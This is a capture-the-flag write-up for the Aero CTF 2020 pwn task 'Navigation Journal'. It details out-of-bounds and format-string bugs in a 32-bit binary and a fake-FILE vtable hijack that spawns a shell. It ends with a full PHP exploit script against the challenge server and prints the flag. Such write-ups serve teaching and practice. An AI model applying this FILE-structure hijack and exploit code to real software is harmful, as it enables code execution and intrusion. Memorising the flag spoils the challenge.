# Navigation Journal - Aero CTF 2020 (pwn, 473p, 14 solved)
## Introduction

Navigation Journal is a pwn task.

An archive containing a binary, a libc and its corresponding loader (`ld.so`).

The binary provides the user with two journals : a main journal and a sub
journal. The user can open, read and close the main journal. They can open, read,
write and close the sub journal. They can also change their username.

This binary is a 32-bits binary.


## Reverse engineering

The program keeps opens and closes files. To keep track of its internal state,
it uses a global variable `nav_jr`. Its type matches the following structure :
```c
char  subBuffer[0x400];
char  mainBuffer[0x200];
FILE *mainJournal;
FILE *subJournal;
```

`open_main_journal` opens `/tmp/journal.txt`
```c
nav_jr->mainJournal = fopen("/tmp/journal.txt", "r");
```

`read_main_journal` reads the main journal into the main buffer. It prints its
content.
```c
if(nav_jr->mainJournal != NULL) {
	fread(nav_jr->mainBuffer, 1, 0x200, nav_jr->mainJournal);
	write(STDOUT_FILENO, nav_jr->mainBuffer, 0x200);
}
```

`close_main_journal` closes the main journal
```c
if(nav_jr->mainJournal != NULL)
	fclose(nav_jr->mainJournal);
```

These functions do not provide a great interest from an attacker's standpoint as
nothing is controlled by the user.


`create_sub_journal` creates a file in `/tmp/`. The function first generates a
random name and asks the user if they agree with this name. If the user refuses,
they can provide their own name. The name cannot contain any of the following
characters: `./tkasnfhglxd`

```c
strcpy(path, "/tmp/");
strcat(path, generate_random_name());

if(askUser()) {
	read(STDIN_FILENO, buffer, 6);
	replace(buffer, "./tkasnfhglxd", ' ');

	strcpy(path, "/tmp/");
	strcat(path, buffer);
}

printf("{+} New file name: ");
printf(path);
```

`close_sub_journal` flushes the sub journal buffer and closes it.
```c
if(nav_jr->subJournal != NULL) {
	fwrite(nav_jr->subBuffer, 0x400, nav_jr->subJournal);
	fclose(nav_jr->subJournal);
}
```

`read_sub_journal` displays 0x604 bytes of the sub journal buffer to the user.
```c
write(STDOUT_FILENO, nav_jr->subBuffer, 0x604);
```

`write_sub_journal` reads 0x604 bytes to the sub journal buffer from the user.
```c
read(STDIN_FILENO, nav_jr->subBuffer, 0x604);
```

## Exploitation

This program contains 3 vulnerabilities: two out-of-bounds (read and write) in
the `read_sub_journal` and `write_sub_journal` functions, and a format string in
the `open_sub_journal`.

The OOB read allows an attacker to leak the address of `nav_jr->mainJournal`.
This address points to the program's heap.

The OOB write allows an attacker to overwrite the address of
`nav_jr->mainJournal` and call the `FILE` functions with a crafter
argument/structure.

The format string is not as powerful as a true format string as some characters,
in particular `n` and `s` are blacklisted. It cannot be used to read or write
arbitrary memory. On top of that, its size is very limited.

Capital letters are not replaced, this means the vulnerability can be used to
leak variables on the stack with `%X`. An address of the libc can be retrieved
with `%17$X`.

The binary can be exploited by following these steps:
1. leak libc base to defeat ASLR
2. leak heap address to determine the address of `subBuffer`
3. forge a fake `FILE` structure on `subBuffer`
4. overwrite the `mainJournal` pointer with a pointer to the fake structure
5. close the main journal to hijack the code execution flow

Closing the main journal will call `fclose(fp)`. By setting the vtable to call
`system` instead of `fclose`, it is possible to have the program call
`system("sh")`.

This can be done by having the first few bytes of the fake `FILE` structure to
be:
```
23 80 AD FB 0A #\x80\xAD\xFB\n
73 68 00       sh\x00
```

**Flag**: `Aero{e9b132dd85f0c1be26c01ab22e2e7d545dff7d52dbda745fe3dd5796bea14153}`

## Appendices

### pwn.php

```php
#!/usr/bin/php
<?php
require_once("Socket.php");

function menu(Tube $t)
{
	$t->expectLine("------ Navigation Journal ------");
	$t->expectLine("1. Open main journal");
	$t->expectLine("2. Read main journal");
	$t->expectLine("3. Close main journal");
	$t->expectLine("4. Create sub journal");
	$t->expectLine("5. Write sub journal");
	$t->expectLine("6. Read sub journal");
	$t->expectLine("7. Close sub journal");
	$t->expectLine("8. Change username");
	$t->expectLine("9. Exit");
	$t->expect("> ");
}

function openSub(Tube $t, $name = null)
{
	menu($t);
	$t->write("4\n");

	$t->expect("{+} Creating journal with name </tmp/");
	$rng = $t->read(16);
	$t->expectLine(">");

	$leak = null;
	$t->expect("{?} Do you agree with this name?[Y\N]: ");
	if($name) {
		$t->write("N\n");
		$t->expect("{?} Enter your name: ");
		$t->write($name);
		$t->expect("{+} New file name: /tmp/");
		$leak = $t->readLine();

		if(6 === strlen($name))
			$t->expect("N");
	}

	return [$rng, $leak];
}

function closeSub($t)
{
	menu($t);
	$t->write("7\n");
}

function write(Tube $t, $data)
{
	menu($t);
	$t->write("5\n");
	$t->expect("{?} Enter data: ");
	$t->write($data);
}

$t = new Socket("tasks.aeroctf.com", 33013);
$t->expect("Enter your name: ");
$t->write("foobar\n");
$t->expect("Hello, ");
$t->readLine();

list($rng, $leak) = openSub($t, "%17\$X\n");
$libc = hexdec($leak) - 0xF7EF3B23 + 0xf7e1e000;
printf("[+] libc: %08X\n", $libc);
closeSub($t);

list($rng, $leak) = openSub($t, "%13\$X\n");
$heap = hexdec($leak) - 0x1830;
printf("[+] heap: %08X\n", $heap);

$struct = pack("V*", 
	0xFBAD0000 | 0x8000 | ord("#"), // _flags
	unpack("V", "\nsh\0")[1], $libc + 0x0003ada0,
	                        0x00000000, //_IO_read_{ptr,end,base}

	0x00000000, 0x00000000, 0x00000000, //_IO_write_{base,ptr,end}
	0x00000000, 0x00000000,             //_IO_buf_{base,end}
	0x00000000, 0x00000000, 0x00000000, //_IO_save_base,backup_base,save_end
	0x00000000, // _IO_marker
	0x00000000, // _chain
	0x00000000, // fileno
	0x00000000, // flags2
	0xFFFFFFFF, // _old_offset
	0x00000000, // cur_column + vtable_offset + shortbuf
	0xdeadbeef, // lock
	0xFFFFFFFF, 0xFFFFFFFF, // offset quad
	0x00000000, 0x00000000, 0x00000000, 0x00000000, // pad
	0x00000000, // pad5
	0x00000000, // mode
	0x00000000, 0x00000000, 0x00000000, 0x00000000, // unused
) . pack("V", 0xcafebabe)
. pack("V", 0xcafebabe)
. pack("V", 0xcafebabe)
. pack("V", 0xcafebabe)
. pack("V", 0xcafebabe)
. pack("V", 0xcafebabe)
. pack("V", $heap + 0x08)
;
$payload = str_pad($struct, 0x600) . pack("V", $heap + 0x08);
write($t, $payload);

menu($t);
$t->write("3\n");

printf("[+] Pipe\n");
$t->pipe();
```
